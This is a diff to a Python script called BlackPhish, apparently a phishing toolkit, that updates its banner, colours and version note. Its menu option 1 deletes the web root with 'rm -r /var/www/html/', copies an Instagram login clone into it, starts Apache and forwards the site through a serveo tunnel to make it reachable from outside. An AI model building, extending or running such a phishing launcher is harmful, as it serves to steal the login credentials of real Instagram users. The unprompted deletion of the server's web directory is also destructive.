@@ -1,6 +1,6 @@
 #!/usr/bin/python3
 
-# version 1.9: - Fixed serveo command - Added banner
+# version 2.0: - Changed some colors and look - Fixed webiste
 
 # Please update version number each time we update
 
@@ -17,7 +17,7 @@ cwd = os.getcwd()
 
 # COLORS #
 
-red = "\033[31;1m"
+red = "\033[91;1m"
 
 reset = "\033[0m"
 
@@ -75,12 +75,13 @@ def banner():
           ███    ██▄\033[31m  ┬  ┌─┐┌─┐┬┌─ \033[91m        ███ \033[31m ┬ ┬┬┌─┐┬ ┬ \033[91m
           ███    ███\033[31m  │  ├─┤│  ├┴┐ \033[91m        ███\033[31m  ├─┤│└─┐├─┤\033[91m
         ▄█████████▀ \033[31m  ┴─┘┴ ┴└─┘┴ ┴ \033[91m        ███\033[31m  ┴ ┴┴└─┘┴ ┴\033[94;1m
+        
                 
-                    Banner made by: [tuf_unkn0wn]
+                    Banner made by: \033[91m[tuf_unkn0wn]\033[94;1m
                     
-                    Script created by: [inc0gnit0] [retro]
+                    Script created by: \033[91m[inc0gnit0] [retro0001]\033[94;1m
                     
-                    Websites created by: [TableFlipGod] 
+                    Websites created by: \033[91m[TableFlipGod] \033[0m
                     
 ''')
     
@@ -89,17 +90,16 @@ def main():  # Main script #
     
     banner()
 
-    choice = input(cyan + "[BlackPhish] -> ") # Get user input #
+    choice = input(red + "    [BlackPhish] -> ") # Get user input #
 
     if choice == "1":
         print(green + '[+] Copying Files')
-        print(green + '[+] Cleaning /var/www/html/ First')
+        print(green + '[+] Cleaning /var/www/html/')
         os.system('rm -r /var/www/html/ && mkdir /var/www/html/')
-        os.system('cp '+'-r '+ cwd  + '/InstagramPhishingSite-Main/' " /var/www/html/")
+        os.system('cp '+'-r '+ cwd  + '/Instagram/Instagram-Login/index.html' " /var/www/html/")
         print(green + '[+] Starting Apache2 Service')
         os.system('service apache2 start')
         serveo_forward()
-        print(green + '[+] Forwarding Traffic to https://inc0gnit0.serveo.net/')
         print(green + '[+] Done')
         main()
 
